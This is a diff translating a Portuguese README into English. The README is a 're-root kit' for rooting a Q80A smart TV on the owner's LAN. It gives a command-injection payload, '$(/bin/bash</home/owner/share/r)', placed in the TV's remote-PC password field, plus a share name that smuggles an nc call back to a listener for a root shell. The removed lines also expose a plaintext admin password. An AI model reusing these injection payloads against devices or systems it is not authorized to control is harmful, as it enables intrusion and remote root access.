@@ -1,73 +1,73 @@
-# Kit de Re-root — Q80A
+# Re-root Kit — Q80A
 
-O stage-2 **já está na TV** em `/home/owner/share/r` (partição `/opt`, sobrevive reboot).
-Re-root = repetir só a injeção. Tempo estimado: ~3 min.
+The stage-2 is **already on the TV** at `/home/owner/share/r` (`/opt` partition, survives reboot).
+Re-rooting = repeating the injection only. Estimated time: ~3 min.
 
-## Pré-requisitos (uma vez só)
+## Prerequisites (one-time)
 
-- TV e PC na mesma LAN (TV `192.168.3.191`, PC `192.168.3.200`)
-- RDP habilitado no Windows — `setup-rdp.ps1` já configura
-- Conta de emergência `tvrdp`/`Tv12345!` existe e é admin (testada na tela de login)
-- Python no PC para os listeners
+- TV and PC on the same LAN (TV `192.168.3.191`, PC `192.168.3.200`)
+- RDP enabled on Windows — `setup-rdp.ps1` configures it
+- Emergency account exists, is admin and was tested at the login screen (do not store its password in a public repo)
+- Python on the PC for the listeners
 
-## Procedimento
+## Procedure
 
-### 1. Sobe os listeners (PC)
+### 1. Start the listeners (PC)
 
 ```powershell
 cd C:\Users\rpf16\q80a_debloat\kit
-start python listener.py   # 9998 shell + 9999 marcador
-start python bridge.py     # 9997 controle <-> 9998
+start python listener.py   # 9998 shell + 9999 marker
+start python bridge.py     # 9997 control <-> 9998
 ```
 
-### 2. Define a senha-payload (PowerShell admin)
+### 2. Set the payload password (admin PowerShell)
 
 ```powershell
 $sec = ConvertTo-SecureString '$(/bin/bash</home/owner/share/r)' -AsPlainText -Force
 Set-LocalUser -Name 'rpf16' -Password $sec
 ```
 
-> Sua senha volta ao normal depois (passo 5). O PIN do Windows Hello continua funcionando.
-> Se algo der errado: login local com `tvrdp`/`Tv12345!` e `Set-LocalUser rpf16` restaura.
+> Your password goes back to normal afterwards (step 5). Windows Hello PIN keeps working.
+> If anything goes wrong: log in locally with the emergency account and `Set-LocalUser rpf16` restores it.
 
-### 3. Na TV
+### 3. On the TV
 
-- Remote PC → perfil do PC (`192.168.3.200`, usuário `rpf16`)
-- Edita a senha do perfil para: `$(/bin/bash</home/owner/share/r)` — exatamente, sem espaços
-- Conecta → toolbar do topo → **Shared Folder**
+- Remote PC → PC profile (`192.168.3.200`, user `rpf16`)
+- Edit the profile password to: `$(/bin/bash</home/owner/share/r)` — exactly this, no spaces
+- Connect → top toolbar → **Shared Folder**
 
-### 4. Confirma
+### 4. Confirm
 
-- `9999`: `STAGE2-OK` = injeção executou
-- `9998`: `bash-3.2#` = shell root ativo
-- Comandos: `python send-cmd.py "pkgcmd -l | head"` (ver `send-cmd.py`)
+- `9999`: `STAGE2-OK` = injection executed
+- `9998`: `bash-3.2#` = root shell active
+- Commands: `python send-cmd.py "pkgcmd -l | head"` (see `send-cmd.py`)
 
-### 5. Depois de usar — restaura a senha e limpa
+### 5. After use — restore the password and clean up
 
 ```powershell
-$sec = ConvertTo-SecureString 'SUA_SENHA_NORMAL' -AsPlainText -Force
+$sec = ConvertTo-SecureString 'YOUR_NORMAL_PASSWORD' -AsPlainText -Force
 Set-LocalUser -Name 'rpf16' -Password $sec
 Remove-SmbShare -Name 'x$(nc 192.168.3.200 9998)' -Force -ErrorAction SilentlyContinue
-# Fecha os listeners (Ctrl+C nas janelas)
+# Stop the listeners (Ctrl+C on the windows)
 ```
 
-## Falhas conhecidas
+## Known failures
 
-| Sintoma | Causa | Fix |
+| Symptom | Cause | Fix |
 |---|---|---|
-| Shared Folder lista pastas mas nada chega | senha do perfil TV diferente da do Windows | re-digita a payload nos dois |
-| `/bin/bash,-i` no listener | payload com espaço (vira vírgula) | usar só `$(/bin/bash<...)` |
-| Nada na 9998 mas `uid=0` na 9999 | injeção OK, payload quebrado | confere o arquivo `r` na TV (`cat` via payload `$(cat>...)` não; re-push via SDB/dev mode) |
-| Shell caiu | reboot/queda RDP | repetir do passo 3 |
-| Lockout do Windows | senha-payload + sem fallback | `tvrdp`/`Tv12345!` na tela de login |
+| Shared Folder lists folders but nothing arrives | TV profile password differs from the Windows one | retype the payload on both sides |
+| `/bin/bash,-i` on the listener | payload with a space (becomes a comma) | use only `$(/bin/bash<...)` |
+| Nothing on 9998 but `uid=0` on 9999 | injection OK, payload broken | check the `r` file on the TV; re-push via SDB/dev mode |
+| Shell dropped | reboot/RDP loss | repeat from step 3 |
+| Windows lockout | payload password + no fallback | emergency account at the login screen |
 
-## Re-push do stage-2 (se a TV perder o arquivo `r`)
+## Re-pushing stage-2 (if the TV loses the `r` file)
 
-Com Developer Mode ativo (host `192.168.3.200`):
+With Developer Mode active (host = your PC IP):
 
 ```powershell
 cd C:\Users\rpf16\q80a_debloat\.tools\tvroot
 python tvroot.py push ..\..\kit\stage2.sh /home/owner/share/r
 ```
 
-(usa `sdb_wire.py` — SDB por TCP 26101, só push funciona)
+(uses `sdb_wire.py` — SDB over TCP 26101; only push works)
